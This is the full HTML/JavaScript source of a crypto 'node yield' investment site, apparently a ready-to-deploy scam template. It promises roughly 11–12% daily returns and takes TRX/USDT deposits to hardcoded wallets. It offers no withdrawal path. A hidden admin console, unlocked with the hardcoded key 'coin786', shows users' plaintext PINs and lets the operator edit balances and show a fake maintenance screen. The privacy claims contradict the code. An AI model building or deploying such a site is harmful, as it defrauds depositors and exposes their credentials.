<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Ultimate Professional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-black: #020617; }
        body { background: #f8fafc; color: #0f172a; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        
        /* Modern Node Card - Optimized Fix */
        .node-card { background: #ffffff; border-radius: 28px; overflow: hidden; display: flex; align-items: center; height: 130px; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03); margin-bottom: 15px; position: relative; }
        .node-img { width: 120px; height: 130px; object-fit: cover; filter: contrast(1.1); }
        .node-info { padding: 0 18px; flex: 1; display: flex; flex-direction: column; justify-content: center; }
        
        .glass-card { background: #ffffff; border-radius: 32px; box-shadow: 0 20px 45px -15px rgba(0,0,0,0.07); border: 1px solid rgba(255,255,255,0.7); }
        .btn-prime { background: var(--nexus-black); color: #fff; border-radius: 22px; font-weight: 800; padding: 18px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .btn-prime:active { transform: scale(0.95); }
        .input-prime { background: #f1f5f9; border-radius: 18px; padding: 16px; width: 100%; border: 2px solid transparent; outline: none; transition: 0.3s; font-weight: 600; }
        .input-prime:focus { border-color: var(--nexus-blue); background: #fff; }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; flex: 1; transition: 0.3s; }
        .nav-link.active { color: var(--nexus-blue); transform: translateY(-3px); }
        
        .legal-modal { display: none; position: fixed; inset: 0; background: white; z-index: 20000; overflow-y: auto; padding: 30px; animation: slideUp 0.4s cubic-bezier(0, 1, 0.5, 1); }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        
        /* Maintenance Overlay */
        #maint-view { position: fixed; inset: 0; background: white; z-index: 50000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 40000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-12 h-12 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[9px] font-black uppercase tracking-[4px] text-slate-400">Booting Protocol...</p>
    </div>

    <div id="maint-view">
        <div class="w-24 h-24 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center text-4xl mb-6"><i class="fa-solid fa-screwdriver-wrench"></i></div>
        <h1 class="text-2xl font-black uppercase italic">System Maintenance</h1>
        <p class="text-sm text-slate-400 mt-4 font-medium">We are upgrading our nodes. Back soon, </p>
        <a href="https://t.me/yourchannel" class="mt-10 text-blue-600 font-black text-xs uppercase tracking-widest">Join Telegram For Updates</a>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-12">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[8px] mt-2">Elite Wealth Terminal</p>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Account ID" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify Session</button>
                <div class="flex justify-between px-2">
                    <p class="text-[9px] font-black text-slate-400 uppercase">New? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register</span></p>
                    <p onclick="alert('Please contact Admin on Telegram to reset PIN.')" class="text-[9px] font-black text-slate-400 uppercase cursor-pointer">Forgot PIN?</p>
                </div>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Create ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Initialize Vault</button>
                <p class="text-center text-[10px] font-black text-slate-400 uppercase">Registered? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login</span></p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-40">
        <header class="p-6 sticky top-0 z-50 bg-white/80 backdrop-blur-3xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-14 h-14 bg-black text-white rounded-[22px] flex items-center justify-center text-2xl font-black shadow-lg">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <div class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span><p class="text-[9px] font-bold text-slate-400 uppercase">Institutional Secure</p></div>
                </div>
            </div>
            <button onclick="logout()" class="w-11 h-11 rounded-xl bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="glass-card p-10 relative overflow-hidden bg-white shadow-2xl">
                <div class="relative z-10 space-y-10">
                    <div>
                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Available Equity</p>
                        <h2 id="ui-bal" class="text-5xl font-black mt-3 tracking-tighter text-slate-900">$0.00</h2>
                    </div>
                    <div class="flex justify-between items-end border-t border-slate-50 pt-8">
                        <div>
                            <p class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">Total Yield</p>
                            <p id="ui-prof" class="text-3xl font-black text-emerald-600">+$0.00</p>
                        </div>
                        <a href="https://t.me/yourtelegram" target="_blank" class="bg-blue-600 text-white px-5 py-3 rounded-2xl text-[9px] font-black uppercase tracking-widest shadow-lg shadow-blue-200"><i class="fa-brands fa-telegram mr-2"></i>Telegram</a>
                    </div>
                </div>
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-blue-50 rounded-full blur-[90px]"></div>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <button onclick="showLegal('about')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 shadow-sm">About Nexus</button>
                <button onclick="showLegal('faq')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 shadow-sm">FAQ Center</button>
                <button onclick="showLegal('privacy')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 shadow-sm">Privacy Policy</button>
                <button onclick="showLegal('terms')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 shadow-sm">Terms</button>
            </div>

            <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-[6px] ml-2">Active Nodes</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 space-y-6 hidden">
            <h3 class="text-sm font-black uppercase border-l-[6px] border-blue-600 pl-4">Premium Nodes (High Yield)</h3>
            <div id="elite-box" class="space-y-4"></div>
            <h3 class="text-sm font-black uppercase border-l-[6px] border-slate-200 pl-4 mt-12">Standard Protocols</h3>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-8 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Capital Injection</h3>
                <select id="d-asset" class="input-prime font-black" onchange="updAddr()">
                    <option value="">Asset Type</option>
                    <option value="TRX">TRX (Trust)</option>
                    <option value="USDT">USDT (Binance TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-6 border-t pt-8">
                    <p id="addr-txt" class="text-[10px] font-mono font-black text-blue-600 text-center p-4 bg-slate-50 rounded-2xl break-all"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Transaction Hash" class="input-prime">
                    <input type="file" id="d-img" class="text-[10px]">
                    <button onclick="sendD()" class="btn-prime">Submit Audit</button>
                </div>
            </div>
            
            <div class="glass-card p-8 space-y-6">
                <input type="text" id="promo-val" placeholder="Have Promo Code?" class="input-prime">
                <button onclick="applyPromo()" class="btn-prime !bg-emerald-600">Apply Reward</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden">
            <div id="ledger-box" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-10 left-8 right-8 h-24 glass-card shadow-2xl flex justify-around items-center px-4 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-home-alt text-2xl mb-1"></i>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-microchip text-2xl mb-1"></i>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-2xl mb-1"></i>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-history text-2xl mb-1"></i>LEDGER</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b">
            <h2 class="text-xl font-black uppercase tracking-widest text-blue-600 italic">Master Console</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-5xl font-light">&times;</button>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-10">
            <button onclick="toggleMaintenance()" id="maint-btn" class="p-6 rounded-3xl bg-amber-50 text-amber-600 font-black text-[10px] uppercase">Toggle Maintenance</button>
            <button onclick="addPromo()" class="p-6 rounded-3xl bg-blue-50 text-blue-600 font-black text-[10px] uppercase">Add Promo Code</button>
        </div>

        <h3 class="text-xs font-black uppercase text-slate-400 mb-6">User Database (Passwords Included)</h3>
        <div id="adm-users" class="space-y-4 mb-12"></div>

        <h3 class="text-xs font-black uppercase text-slate-400 mb-6">Pending Deposits</h3>
        <div id="adm-requests" class="space-y-6"></div>
    </div>

    <div id="legal-modal" class="legal-modal">
        <button onclick="closeLegal()" class="text-4xl float-right">&times;</button>
        <h2 id="legal-h" class="text-2xl font-black uppercase mt-12 mb-6">---</h2>
        <div id="legal-body" class="text-sm text-slate-500 space-y-4 leading-relaxed"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeData = {
            elite: [
                { id: 'e1', name: "Sovereign Alpha", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 'e2', name: "Titan Protocol", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" }
            ],
            retail: Array.from({length: 12}, (_, i) => ({
                id: `r${i}`, name: `Nexus Node v${i+1}`, price: 100 + (i*150), daily: 10 + (i*12), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
            
            // Maintenance Check
            onValue(ref(db, 'system/maintenance'), (s) => {
                if(s.val() === true && localStorage.getItem('nx_adm') !== 'true') {
                    document.getElementById('maint-view').style.display = 'flex';
                } else {
                    document.getElementById('maint-view').style.display = 'none';
                }
            });

            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        // ADMIN ACCESS (4 TAPS ON LOGO)
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Nexus Protocol Key:") === "coin786") { 
                localStorage.setItem('nx_adm', 'true');
                document.getElementById('adm-panel').classList.remove('hidden'); 
                runAdm(); 
            } taps = 0; }
        };

        function runAdm() {
            // Users Management
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('adm-users').innerHTML = u ? Object.entries(u).map(([id, d]) => `
                    <div class="bg-slate-50 p-6 rounded-3xl space-y-4">
                        <div class="flex justify-between items-center">
                            <p class="font-black text-xs uppercase">${id} (PIN: ${d.password})</p>
                            <span class="text-[9px] font-black ${d.banned ? 'text-rose-600' : 'text-emerald-600'}">${d.banned ? 'BANNED' : 'ACTIVE'}</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}', 'add')" class="bg-emerald-600 text-white text-[8px] font-black px-3 py-2 rounded-xl">ADD $</button>
                            <button onclick="modBal('${id}', 'rem')" class="bg-rose-600 text-white text-[8px] font-black px-3 py-2 rounded-xl">DEDUCT $</button>
                            <button onclick="toggleBan('${id}', ${d.banned || false})" class="bg-black text-white text-[8px] font-black px-3 py-2 rounded-xl">${d.banned ? 'UNBAN' : 'BAN'}</button>
                        </div>
                    </div>`).join('') : '';
            });

            // Pending Audits
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('adm-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-6 space-y-4 border">
                        <p class="text-[10px] font-black uppercase">${r.user} | $${r.amount}</p>
                        <img src="${r.proof}" class="w-full h-40 object-cover rounded-xl">
                        <div class="flex gap-2">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="bg-emerald-600 text-white font-black text-[10px] py-3 rounded-xl flex-1">APPROVE</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="bg-rose-600 text-white font-black text-[10px] py-3 rounded-xl flex-1">REJECT</button>
                        </div>
                    </div>`).join('') : '<p class="text-center font-black text-slate-300 uppercase text-[9px]">No Audits</p>';
            });
        }

        window.modBal = async (uid, type) => {
            const val = prompt("Enter amount:");
            if(!val) return;
            const s = await get(ref(db, `users/${uid}`));
            const cur = s.val().balance || 0;
            const n = type === 'add' ? cur + parseFloat(val) : cur - parseFloat(val);
            await update(ref(db, `users/${uid}`), { balance: n });
            alert("Updated, !");
        };

        window.toggleBan = async (uid, cur) => { await update(ref(db, `users/${uid}`), { banned: !cur }); };
        window.toggleMaintenance = async () => {
            const s = await get(ref(db, 'system/maintenance'));
            await set(ref(db, 'system/maintenance'), !s.val());
            alert("Maintenance Mode Toggled!");
        };

        window.addPromo = async () => {
            const code = prompt("Enter Code Name:");
            const prize = prompt("Enter Reward Amount:");
            if(code && prize) await set(ref(db, `system/promos/${code}`), parseFloat(prize));
        };

        window.applyPromo = async () => {
            const code = document.getElementById('promo-val').value;
            const uid = localStorage.getItem('nx_usr');
            const s = await get(ref(db, `system/promos/${code}`));
            if(s.exists()) {
                const prize = s.val();
                const u = await get(ref(db, `users/${uid}`));
                await update(ref(db, `users/${uid}`), { balance: (u.val().balance || 0) + prize });
                await remove(ref(db, `system/promos/${code}`)); // Single use
                alert("Promo Applied! Profit added, ✔️");
            } else alert("Invalid Code");
        };

        // --- CORE FUNCTIONS ---
        function renderNodes() {
            const ui = (n) => `
                <div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div class="node-info">
                        <h4 class="text-[11px] font-black uppercase text-slate-800">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600 mt-1">Daily Yield: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-xl font-black text-slate-900">$${n.price}</span>
                            <button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-5 py-2.5 rounded-xl shadow-lg shadow-blue-100">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        }

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr');
            const s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Insufficient Balance!");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/nodes`), { name, nextClaim: Date.now() + 86400000 });
            alert("Protocol Deployed! 🚀");
            nav('home');
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                if(d.banned) { logout(); alert("Account Terminated."); return; }
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600">
                        <div><p class="text-[11px] font-black uppercase">${v.name}</p><p class="text-[9px] text-slate-300 font-bold mt-1">Status: Mining</p></div>
                        <span class="text-[10px] font-black bg-slate-50 px-4 py-2 rounded-xl">ACTIVE</span>
                    </div>`).join('') || '<p class="text-center py-10 font-black text-slate-300 uppercase text-[9px]">No Active Protocols</p>';
            });
        }

        // Standard helpers
        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.login = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Access Denied."); };
        window.signup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value; const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.sendD = () => { const f = document.getElementById('d-img').files[0]; if(!f) return alert("Audit proof required."); const reader = new FileReader(); reader.readAsDataURL(f); reader.onload = async () => { const uid = localStorage.getItem('nx_usr'), key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: document.getElementById('d-amt').value, tid: document.getElementById('d-tid').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Audit Initiated."); nav('ledger'); }; };
        window.audit = async (id, user, amt, status) => { if(status === 'Cleared') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) }); } await update(ref(db, `users/${user}/history/${id}`), { status }); await remove(ref(db, 'admin/requests/' + id)); };

        const legals = {
            about: "Nexus Omni is a decentralized financial engine. We specialize in automated yield farming via institutional-grade node protocols. Our mission is to simplify high-frequency trading for retail clients.",
            faq: "<b>1. How to deploy?</b> Deposit funds and click Deploy on any node.<br><br><b>2. Payouts?</b> Profits are added every 24 hours.<br><br><b>3. Maintenance?</b> We occasionally upgrade nodes for better efficiency.",
            privacy: "We do not store logs. All data is encrypted and kept in isolated Firebase vaults. Your security is our priority.",
            terms: "By deploying nodes, you agree to the dynamic yield protocols. Abuse of promo codes leads to immediate ban."
        };
        window.showLegal = (t) => { document.getElementById('legal-h').innerText = t.toUpperCase(); document.getElementById('legal-body').innerHTML = legals[t]; document.getElementById('legal-modal').style.display = 'block'; };
        window.closeLegal = () => document.getElementById('legal-modal').style.display = 'none';
    </script>
</body>
</html>
